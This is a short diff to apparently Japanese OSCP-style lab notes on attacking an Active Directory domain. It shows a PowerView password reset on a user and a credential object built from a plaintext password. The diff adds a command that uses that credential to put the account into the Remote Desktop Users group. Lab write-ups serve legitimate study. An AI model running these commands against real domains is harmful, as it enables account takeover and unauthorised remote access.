@@ -321,6 +321,8 @@ Set-DomainUserPassword -Identity "CN=g.jarvis,CN=Users,DC=oscp,DC=exam" -Account
 ```powershell
 $SecPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('OSCP.EXAM\r.andrews', $SecPassword)
+
+Add-DomainGroupMember -Identity 'CN=Remote Desktop Users,CN=Builtin,DC=oscp,DC=exam' -Members 'CN=g.jarvis,CN=Users,DC=oscp,DC=exam' -Credential $Cred
 ```
 
 - パスワード変更に成功
